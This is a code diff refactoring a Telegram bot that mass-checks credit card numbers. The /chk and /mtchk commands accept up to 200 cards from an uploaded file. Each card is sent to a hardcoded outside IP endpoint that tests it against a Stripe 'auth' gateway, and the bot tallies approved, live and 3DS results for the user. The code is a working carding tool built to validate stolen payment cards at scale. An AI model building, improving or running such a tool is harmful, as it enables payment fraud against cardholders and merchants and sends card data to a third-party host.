@@ -1115,17 +1115,17 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         final_text = (
             f"{header}\n"
             f"✘ Card         ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
-            "✘ Gateway      ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+            f"✘ Gateway      ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
             f"✘ Response     ➜ {formatted_response}\n"
-            "――――――――――――――――\n"
+            f"――――――――――――――――\n"
             f"✘ Brand        ➜ {escape_markdown(brand, version=2)}\n"
             f"✘ Issuer       ➜ {escape_markdown(issuer, version=2)}\n"
             f"✘ Country      ➜ {escape_markdown(country_name, version=2)}\n"
-            "――――――――――――――――\n"
+            f"――――――――――――――――\n"
             f"✘ Request By   ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan', 'Free'), version=2)}\\]\n"
             f"✘ Developer    ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
             f"✘ Time         ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
-            "――――――――――――――――"
+            f"――――――――――――――――"
         )
 
         await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
@@ -1200,7 +1200,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Send processing message
     processing_text = (
         "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+        f"• 𝘾𝙖𝙧� ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
         "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘵𝗵\n"
         "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
         "═════════════════════"
@@ -1400,9 +1400,9 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-import aiohttp
-import asyncio
 import time
+import asyncio
+import aiohttp
 from telegram import Update, InputFile
 from telegram.ext import ContextTypes
 
@@ -1411,15 +1411,19 @@ last_mtchk_usage = {}
 
 # ─── /mtchk Handler ────────────────────────────────
 async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles the /mtchk command, which performs a mass check of credit cards
+    from a text file. It enforces cooldowns and validates the input file.
+    """
     user_id = update.effective_user.id
     now = time.time()
 
-    # Restrict private use except owner
+    # Restrict private use except for the owner
     if update.effective_chat.type == "private" and user_id != OWNER_ID:
         await update.message.reply_text("❌ This command is not allowed in private chats.")
         return
 
-    # Cooldown (7s for non-owner)
+    # Cooldown (7 seconds for non-owner)
     if user_id != OWNER_ID:
         if user_id in last_mtchk_usage and now - last_mtchk_usage[user_id] < 7:
             remaining = int(7 - (now - last_mtchk_usage[user_id]))
@@ -1430,7 +1434,7 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         last_mtchk_usage[user_id] = now
 
-    # Ensure file is attached or replied
+    # Ensure a .txt file is attached or replied to
     if not update.message.document and not (
         update.message.reply_to_message and update.message.reply_to_message.document
     ):
@@ -1445,22 +1449,27 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file = await context.bot.get_file(document.file_id)
     file_path = await file.download_to_drive(custom_path="input_cards.txt")
 
+    # Read cards from the file
     with open(file_path, "r", encoding="utf-8") as f:
         cards = [line.strip() for line in f if line.strip()]
 
+    # Validate number of cards
     if len(cards) > 200:
         await update.message.reply_text("⚠️ Maximum 200 cards allowed per file.")
         return
 
-    # Initial progress message
+    # Send initial processing message
     processing_msg = await update.message.reply_text("🔄 Preparing Mass Stripe Auth check...")
 
-    # Run background task
+    # Run background task to process the cards
     asyncio.create_task(background_check(update, context, cards, processing_msg))
 
 
 # ─── Background Task ────────────────────────────────
 async def background_check(update, context, cards, processing_msg):
+    """
+    Performs the actual mass card checking in the background.
+    """
     results = []
     approved = declined = threed = live = 0
     total = len(cards)
@@ -1473,16 +1482,18 @@ async def background_check(update, context, cards, processing_msg):
                     f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
                     timeout=20
                 ) as resp:
+                    if resp.status != 200:
+                        raise aiohttp.ClientError(f"HTTP Error {resp.status}")
                     data = await resp.json()
                     status = data.get("status", "Unknown")
             except Exception as e:
                 status = f"Error: {str(e)}"
 
-            # Store card + status properly
+            # Store card + status for the output file
             line = f"{card} → {status}"
             results.append(line)
 
-            # Count summary
+            # Count the different statuses
             st_low = status.lower()
             if "approved" in st_low:
                 approved += 1
@@ -1493,56 +1504,63 @@ async def background_check(update, context, cards, processing_msg):
             elif "live" in st_low:
                 live += 1
 
-            # Progress bar (compact box)
-            percent = int((i / total) * 100)
-            filled = "█" * (percent // 10)
-            empty = "░" * (10 - (percent // 10))
-            elapsed = time.time() - start_time
-            eta = int((elapsed / i) * (total - i)) if i > 0 else 0
+            # Progress bar update (every 10 cards to reduce edits)
+            if i % 10 == 0 or i == total:
+                percent = int((i / total) * 100)
+                filled = "█" * (percent // 10)
+                empty = "░" * (10 - (percent // 10))
+                elapsed = time.time() - start_time
+                eta = int((elapsed / i) * (total - i)) if i > 0 else 0
 
-            progress_text = (
-                "╔══ 🔥 Mass Stripe Auth 🔥 ══╗\n"
-                f"  [{filled}{empty}] {percent}%\n"
-                f"  ✅ Checked: {i}/{total}\n"
-                f"  ⏳ ETA: {eta}s\n"
-                "╚══════════════════════════╝"
-            )
+                progress_text = (
+                    "╔══ 🔥 Mass Stripe Auth 🔥 ══╗\n"
+                    f"  [{filled}{empty}] {percent}%\n"
+                    f"  ✅ Checked: {i}/{total}\n"
+                    f"  ⏳ ETA: {eta}s\n"
+                    "╚══════════════════════════╝"
+                )
+                try:
+                    await processing_msg.edit_text(progress_text)
+                except Exception:
+                    pass
+            
+            # Simple sleep to avoid flooding the API
+            await asyncio.sleep(2)
 
-            try:
-                await processing_msg.edit_text(progress_text)
-            except:
-                pass
-
-            await asyncio.sleep(2)  # delay to avoid API flooding
-
-    # ✅ Write checked.txt with all cards + status
-    with open("checked.txt", "w", encoding="utf-8") as f:
+    # Write all results to the output file
+    output_filename = "checked.txt"
+    with open(output_filename, "w", encoding="utf-8") as f:
         for line in results:
             f.write(line + "\n")
 
-    # Delete progress box
+    # Delete the progress message
     try:
         await processing_msg.delete()
-    except:
+    except Exception:
         pass
 
-    # Build summary for caption
+    # Build the final summary for the caption
     summary = (
         "✅ Mass Stripe Auth Check Completed!\n\n"
         f"📊 Total Checked: {total}\n"
         f"✅ Approved : {approved}\n"
         f"❌ Declined : {declined}\n"
-        f"⚠️ 3DS     : {threed}\n"
+        f"⚠️ 3DS      : {threed}\n"
         f"💳 CCN Live: {live}\n"
         "━━━━━━━━━━━━━━━━━━\n"
         "🌐 Gateway = Mass Stripe Auth"
     )
 
-    # Send file with summary in caption
-    await update.message.reply_document(
-        document=InputFile("checked.txt"),
-        caption=summary
-    )
+    # Send the output file
+    try:
+        with open(output_filename, "rb") as f:
+            await update.message.reply_document(
+                document=InputFile(f, filename=output_filename),
+                caption=summary
+            )
+    except Exception as e:
+        await update.message.reply_text(f"❌ An error occurred while sending the file: {e}")
+
 
 
 import asyncio
